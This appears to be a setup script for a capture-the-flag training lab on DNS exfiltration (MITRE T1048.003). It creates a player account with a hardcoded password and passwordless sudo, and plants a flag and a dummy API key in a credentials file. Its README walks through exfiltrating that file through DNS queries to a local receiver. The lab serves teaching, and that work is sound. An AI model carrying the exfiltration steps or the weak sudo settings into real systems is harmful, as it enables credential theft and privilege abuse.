#!/bin/bash
set -euo pipefail
PLAYER="player"; PASS="Player@123"
FLAG="HACKTIFY{DNS_EXFIL_$(hostname|sha256sum|cut -c1-8)}"
id "$PLAYER" &>/dev/null || { useradd -m -s /bin/bash "$PLAYER"; echo "$PLAYER:$PASS"|chpasswd; }
echo "$PLAYER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/player-dnsex; chmod 440 /etc/sudoers.d/player-dnsex
mkdir -p /opt/sensitive-data && chmod 755 /opt/sensitive-data
echo "$FLAG" > /opt/sensitive-data/credentials.txt
echo "api_key=sk-12345" >> /opt/sensitive-data/credentials.txt
chmod 644 /opt/sensitive-data/credentials.txt
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cp "${SCRIPT_DIR}/dns_exfil_server.py" /opt/sensitive-data/
cp "${SCRIPT_DIR}/dns_exfil_client.sh" /opt/sensitive-data/
chmod 755 /opt/sensitive-data/dns_exfil_client.sh /opt/sensitive-data/dns_exfil_server.py
cat > /home/$PLAYER/README.txt << 'RMEOF'
=== T1048.003 DNS Exfiltration ===
Login  : player / Player@123
Goal   : Exfiltrate data using DNS queries (encode data in subdomain labels).
Step 1 : Start DNS exfil receiver: sudo python3 /opt/sensitive-data/dns_exfil_server.py 5353
Step 2 : In another terminal: bash /opt/sensitive-data/dns_exfil_client.sh /opt/sensitive-data/credentials.txt localhost 5353
Step 3 : Watch server terminal — data reconstructed from DNS queries
         This simulates sending data to attacker-controlled DNS server
RMEOF
chown $PLAYER:$PLAYER /home/$PLAYER/README.txt
echo "[+] T1048.003-DNS setup complete."
